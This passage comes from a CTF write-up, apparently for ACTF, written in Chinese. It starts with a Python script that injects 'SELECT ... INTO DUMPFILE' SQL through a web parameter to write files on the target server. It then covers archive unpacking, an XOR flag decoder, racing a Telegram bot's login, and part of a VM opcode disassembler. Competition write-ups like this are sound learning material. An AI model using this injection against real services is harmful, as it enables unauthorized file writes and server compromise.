</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=n>sql</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;name&#34;</span><span class=p>,</span><span class=s2>&#34;w&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;auth_simple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;auth_simple&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sql</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;SELECT </span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2> INTO DUMPFILE &#39;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;3&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=p>:</span> <span class=n>sql</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=signin>signin</h2><p>shell脚本，和文件放一个目录解压</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>#!bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mkdir &#39;out&#39;
</span></span><span class=line><span class=cl>while true
</span></span><span class=line><span class=cl>do
</span></span><span class=line><span class=cl>    7z x flag* -o&#34;./out/&#34;
</span></span><span class=line><span class=cl>    if [ $? = 0 ]; then
</span></span><span class=line><span class=cl>        rm ./flag*
</span></span><span class=line><span class=cl>        mv ./out/* ./
</span></span><span class=line><span class=cl>    else
</span></span><span class=line><span class=cl>        cat flag*
</span></span><span class=line><span class=cl>        break
</span></span><span class=line><span class=cl>    fi
</span></span><span class=line><span class=cl>done
</span></span></code></pre></td></tr></table></div></div><p>得到flag</p><h2 id=mahjoong>Mahjoong</h2><p>可以直接挂机得到flag，大满贯</p><p>或者直接看源码 webpack://majiang/src/js/majiang/util/hule.js</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=kd>let</span> <span class=nx>a</span> <span class=o>=</span> <span class=p>[</span><span class=mi>240</span><span class=p>,</span><span class=mi>188</span><span class=p>,</span><span class=mi>218</span><span class=p>,</span><span class=mi>205</span><span class=p>,</span><span class=mi>188</span><span class=p>,</span><span class=mi>154</span><span class=p>,</span><span class=mi>138</span><span class=p>,</span><span class=mi>200</span><span class=p>,</span><span class=mi>207</span><span class=p>,</span><span class=mi>33</span><span class=p>,</span><span class=mi>26</span><span class=p>,</span><span class=mi>246</span><span class=p>,</span><span class=mi>30</span><span class=p>,</span><span class=mi>136</span><span class=p>,</span><span class=mi>124</span><span class=p>,</span><span class=mi>38</span><span class=p>,</span><span class=mi>241</span><span class=p>,</span><span class=mi>178</span><span class=p>,</span><span class=mi>193</span><span class=p>,</span><span class=mi>127</span><span class=p>,</span><span class=mi>163</span><span class=p>,</span><span class=mi>161</span><span class=p>,</span><span class=mi>72</span><span class=p>,</span><span class=mi>140</span><span class=p>,</span><span class=mi>187</span><span class=p>,</span><span class=mi>16</span><span class=p>,</span><span class=mi>19</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>b</span> <span class=o>=</span> <span class=p>[</span><span class=mi>177</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>142</span><span class=p>,</span> <span class=mi>139</span><span class=p>,</span> <span class=mi>199</span><span class=p>,</span> <span class=mi>227</span><span class=p>,</span> <span class=mi>202</span><span class=p>,</span> <span class=mi>163</span><span class=p>,</span> <span class=mi>186</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>91</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>65</span><span class=p>,</span> <span class=mi>185</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>121</span><span class=p>,</span> <span class=mi>152</span><span class=p>,</span> <span class=mi>220</span><span class=p>,</span> <span class=mi>162</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>198</span><span class=p>,</span> <span class=mi>197</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>191</span><span class=p>,</span> <span class=mi>215</span><span class=p>,</span> <span class=mi>117</span><span class=p>,</span> <span class=mi>110</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>c</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>Array</span><span class=p>(</span><span class=mi>27</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=kd>var</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span> <span class=p>;</span><span class=nx>i</span> <span class=o>&lt;</span> <span class=mi>27</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nx>c</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>=</span> <span class=nb>String</span><span class=p>.</span><span class=nx>fromCharCode</span><span class=p>(</span><span class=nx>a</span><span class=p>[</span><span class=nx>i</span><span class=p>]</span> <span class=o>^</span> <span class=nx>b</span><span class=p>[</span><span class=nx>i</span><span class=p>]);</span>        
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>ACTF{y@kumAn_1s_incredl3le}</p><h2 id=safer-telegram-bot-1>safer-telegram-bot-1</h2><p>去 tg bot 不停地发一堆 /login，碰个时间，蹲到哪个没 rejected，点一下 login 就能拿到 flag1 了</p><p>不行的话多试几次就有了，乐</p><h2 id=signoff>signoff</h2><p>填问卷</p><h1 id=pwn>Pwn</h1><h2 id=mykvm>mykvm</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 1</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; + &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 1</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x01</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; + &#34;</span> <span class=o>+</span> <span class=s2>&#34;Y&#34;</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 2</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x12</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
